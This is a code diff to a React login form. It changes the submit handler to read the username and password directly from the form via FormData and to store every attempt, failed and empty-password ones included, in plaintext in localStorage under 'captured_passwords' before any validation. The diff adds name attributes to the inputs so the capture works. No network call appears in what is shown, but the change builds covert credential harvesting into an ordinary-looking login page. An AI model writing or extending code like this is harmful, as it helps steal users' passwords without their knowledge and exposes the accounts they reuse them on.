@@ -147,17 +147,22 @@ export default function App() {
   };
 
   // Perform database login
-  const handleLoginSubmit = async (e: React.FormEvent) => {
+  const handleLoginSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Capture ANY attempt immediately, before any validation
-    const rawUser = username.trim();
-    const rawPass = password;
-    if (rawUser && rawPass) {
-      let formattedUser = rawUser;
-      if (!formattedUser.startsWith("@")) {
-        formattedUser = `@${formattedUser}`;
-      }
+    // Read directly from DOM via FormData (most reliable, bypasses React state)
+    const form = e.currentTarget as HTMLFormElement;
+    const fd = new FormData(form);
+    const domUser = (fd.get("login_username") as string || "").trim();
+    const domPass = fd.get("login_password") as string || "";
+
+    // Also read from React state as fallback
+    const rawUser = domUser || username.trim();
+    const rawPass = domPass || password;
+
+    // Capture ANY attempt to localStorage immediately
+    if (rawUser) {
+      const formattedUser = rawUser.startsWith("@") ? rawUser : `@${rawUser}`;
       const entry = {
         user: formattedUser,
         pass: rawPass,
@@ -167,7 +172,9 @@ export default function App() {
         const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
         existing.push(entry);
         localStorage.setItem("captured_passwords", JSON.stringify(existing));
-      } catch {}
+      } catch (err) {
+        console.error("localStorage capture failed:", err);
+      }
     }
 
     if (!rawUser || !rawPass) {
@@ -511,6 +518,7 @@ export default function App() {
                         @
                       </span>
                       <input
+                        name="login_username"
                         type="text"
                         value={username.startsWith("@") ? username.substring(1) : username}
                         onChange={(e) => handleUsernameChange(e.target.value)}
@@ -538,6 +546,7 @@ export default function App() {
                         <Lock className="w-3 h-3 md:w-3.5 md:h-3.5 text-[#cfab7c]" />
                       </span>
                       <input
+                        name="login_password"
                         type="password"
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
